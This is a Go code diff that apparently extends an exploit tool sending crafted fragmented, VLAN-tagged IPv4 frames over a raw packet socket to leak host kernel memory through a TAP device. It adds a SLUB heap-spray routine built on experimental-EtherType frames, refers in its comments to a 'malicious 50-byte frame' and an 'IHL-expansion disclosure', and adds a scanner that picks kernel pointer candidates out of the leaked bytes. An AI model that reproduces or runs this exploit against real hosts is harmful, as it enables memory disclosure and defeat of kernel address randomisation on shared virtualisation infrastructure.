@@ -17,15 +17,17 @@ import (
 )
 
 const (
-	solPacket     = 263
-	packetVnetHdr = 15
-	soRcvbufForce = 33
-	ethPAll       = 0x0003
-	ipProtoICMP   = 1
-	ipProtoUDP    = 17
-	ipProtoRaw    = 253
-	mutatedIHL    = 60
-	ethPArp       = 0x0806
+	solPacket      = 263
+	packetVnetHdr  = 15
+	soRcvbufForce  = 33
+	ethPAll        = 0x0003
+	ipProtoICMP    = 1
+	ipProtoUDP     = 17
+	ipProtoRaw     = 253
+	mutatedIHL     = 60
+	ethPArp        = 0x0806
+	ethPExperiment = 0x88b5
+	egressSprayLen = 128
 )
 
 type egressRoute struct {
@@ -90,20 +92,21 @@ func runEgress(c cfg) error {
 	}
 	defer syscall.Close(rx)
 
-	// The two VLAN headers live inside the raw frame, so keep the IPv4
-	// fragment below MTU by their full eight-byte cost.
-	maxChunk := ((ifi.MTU - ipLen - 2*vlanLen) / 8) * 8
+	// VLAN headers live inside the raw frame, so keep each IPv4 fragment
+	// below MTU by their full on-wire cost.
+	maxChunk := ((ifi.MTU - ipLen - c.vlanTags*vlanLen) / 8) * 8
 	if maxChunk < 8 {
-		return fmt.Errorf("interface MTU %d is too small for double-VLAN IPv4 fragments", ifi.MTU)
+		return fmt.Errorf("interface MTU %d is too small for %d-tag IPv4 fragments", ifi.MTU, c.vlanTags)
 	}
 	fragments := (c.egressRest + maxChunk - 1) / maxChunk
 	proto := byte(ipProtoRaw)
 	if c.transport == "udp" {
 		proto = ipProtoUDP
 	}
-	fmt.Printf("egress: iface=%s mtu=%d src=%s src_mac=%s dst=%s next_hop=%s next_mac=%s route=%s/%d transport=%s payload=%d fragments=%d+head\n",
+	fmt.Printf("egress: iface=%s mtu=%d src=%s src_mac=%s dst=%s next_hop=%s next_mac=%s route=%s/%d transport=%s payload=%d fragments=%d+head spray=%d fill=0x%02x\n",
 		ifi.Name, ifi.MTU, src, ifi.HardwareAddr, dst, nextHop, nextMAC,
-		routeIPv4(route.dest), route.prefix, c.transport, c.head+c.egressRest, fragments)
+		routeIPv4(route.dest), route.prefix, c.transport, c.head+c.egressRest, fragments,
+		c.egressSpray, c.egressFill)
 
 	samples := make([]egressPrepared, 0, c.count)
 	expected := make(map[uint16]struct{}, c.count)
@@ -127,7 +130,7 @@ func runEgress(c cfg) error {
 		expected[id] = struct{}{}
 	}
 	for sample, prepared := range samples {
-		if err := egressSendSequence(tx, ifi, ifi.HardwareAddr, nextMAC, src, dst, prepared.id, proto, prepared.payload, c.head, maxChunk, c.csumOffset); err != nil {
+		if err := egressSendSequence(tx, ifi, ifi.HardwareAddr, nextMAC, src, dst, prepared.id, proto, prepared.payload, c.head, maxChunk, c.csumOffset, c.vlanTags, c.egressSpray, c.egressFill, c.sprayDelay); err != nil {
 			return fmt.Errorf("sample %d: %w", sample, err)
 		}
 	}
@@ -330,22 +333,47 @@ func egressPacketSocket(ifindex int, vnet bool) (int, error) {
 	return fd, nil
 }
 
-func egressSendSequence(fd int, ifi *net.Interface, srcMAC, dstMAC net.HardwareAddr, srcIP, dstIP net.IP, id uint16, proto byte, payload []byte, head, maxChunk, csumOffset int) error {
+func egressSendSequence(fd int, ifi *net.Interface, srcMAC, dstMAC net.HardwareAddr, srcIP, dstIP net.IP, id uint16, proto byte, payload []byte, head, maxChunk, csumOffset, vlanTags, spray int, sprayFill byte, sprayDelay time.Duration) error {
 	for offset := head; offset < len(payload); {
 		n := min(maxChunk, len(payload)-offset)
 		more := offset+n < len(payload)
 		ip := egressFragment(offset, more, payload[offset:offset+n], id, srcIP, dstIP, proto)
-		if err := egressSendFrame(fd, ifi.Index, dstMAC, egressFrame(ip, srcMAC, dstMAC), true, l2Len+ipLen, 0); err != nil {
+		if err := egressSendFrame(fd, ifi.Index, dstMAC, egressFrame(ip, srcMAC, dstMAC, vlanTags), true, uint16(l2LenForTags(vlanTags)+ipLen), 0); err != nil {
 			return fmt.Errorf("send fragment offset=%d length=%d: %w", offset, n, err)
 		}
 		offset += n
 	}
+	if spray > 0 {
+		poison := egressSprayFrame(srcMAC, dstMAC, sprayFill)
+		for i := 0; i < spray; i++ {
+			if err := egressSendFrame(fd, ifi.Index, dstMAC, poison, false, 0, 0); err != nil {
+				return fmt.Errorf("send predecessor spray %d/%d: %w", i+1, spray, err)
+			}
+		}
+		if sprayDelay > 0 {
+			time.Sleep(sprayDelay)
+		}
+	}
 	first := egressFragment(0, true, payload[:head], id, srcIP, dstIP, proto)
-	if err := egressSendFrame(fd, ifi.Index, dstMAC, egressFrame(first, srcMAC, dstMAC), true, csumAtIP, uint16(csumOffset)); err != nil {
+	if err := egressSendFrame(fd, ifi.Index, dstMAC, egressFrame(first, srcMAC, dstMAC, vlanTags), true, uint16(l2LenForTags(vlanTags)), uint16(csumOffset)); err != nil {
 		return fmt.Errorf("send head fragment: %w", err)
 	}
 	fmt.Printf("sent: id=0x%04x head=%d rest=%d adjustment=%02x%02x\n", id, head, len(payload)-head, payload[12], payload[13])
 	return nil
+}
+
+// egressSprayFrame creates a short, non-IP frame that the host TAP copies into
+// the same dedicated small-head cache used by the malicious 50-byte frame. An
+// unhandled experimental EtherType makes the frame eligible for an immediate
+// synchronous drop; if SLUB reuses that object for the following head, bytes
+// beyond the head's logical tail retain sprayFill and become visible in the
+// IHL-expansion disclosure.
+func egressSprayFrame(src, dst net.HardwareAddr, fill byte) []byte {
+	frame := bytesRepeat(egressSprayLen, fill)
+	copy(frame[0:6], dst)
+	copy(frame[6:12], src)
+	binary.BigEndian.PutUint16(frame[12:14], ethPExperiment)
+	return frame
 }
 
 func egressSendFrame(fd, ifindex int, dstMAC net.HardwareAddr, frame []byte, checksum bool, start, offset uint16) error {
@@ -406,16 +434,23 @@ func egressFragment(offset int, more bool, payload []byte, id uint16, src, dst n
 	return pkt
 }
 
-func egressFrame(ip []byte, src, dst net.HardwareAddr) []byte {
-	f := make([]byte, l2Len+len(ip))
+func egressFrame(ip []byte, src, dst net.HardwareAddr, tags int) []byte {
+	l2 := l2LenForTags(tags)
+	f := make([]byte, l2+len(ip))
 	copy(f[0:6], dst)
 	copy(f[6:12], src)
 	binary.BigEndian.PutUint16(f[12:], vlanProto)
-	binary.BigEndian.PutUint16(f[14:], 0)
-	binary.BigEndian.PutUint16(f[16:], vlanProto)
-	binary.BigEndian.PutUint16(f[18:], 0)
-	binary.BigEndian.PutUint16(f[20:], ipProtoEth)
-	copy(f[l2Len:], ip)
+	off := ethLen
+	for i := 0; i < tags; i++ {
+		binary.BigEndian.PutUint16(f[off:], 0)
+		proto := uint16(vlanProto)
+		if i == tags-1 {
+			proto = ipProtoEth
+		}
+		binary.BigEndian.PutUint16(f[off+2:], proto)
+		off += vlanLen
+	}
+	copy(f[l2:], ip)
 	return f
 }
 
@@ -523,6 +558,30 @@ func egressPrintOptions(ip []byte, head int) {
 	if len(options) > head {
 		leak := options[head:]
 		fmt.Printf("  past-linear hex=%s ascii=%q\n", hex.EncodeToString(leak), string(leak))
+		printKernelPointerCandidates("  ", leak)
+	}
+}
+
+type kernelPointerCandidate struct {
+	offset int
+	value  uint64
+}
+
+func kernelPointerCandidates(data []byte) []kernelPointerCandidate {
+	var out []kernelPointerCandidate
+	for offset := 0; offset+8 <= len(data); offset++ {
+		value := binary.LittleEndian.Uint64(data[offset : offset+8])
+		if value>>48 == 0xffff && value&0x7 == 0 {
+			out = append(out, kernelPointerCandidate{offset: offset, value: value})
+		}
+	}
+	return out
+}
+
+func printKernelPointerCandidates(prefix string, data []byte) {
+	for _, candidate := range kernelPointerCandidates(data) {
+		fmt.Printf("%shost-pointer-candidate offset=%d little=0x%016x\n",
+			prefix, candidate.offset, candidate.value)
 	}
 }
 
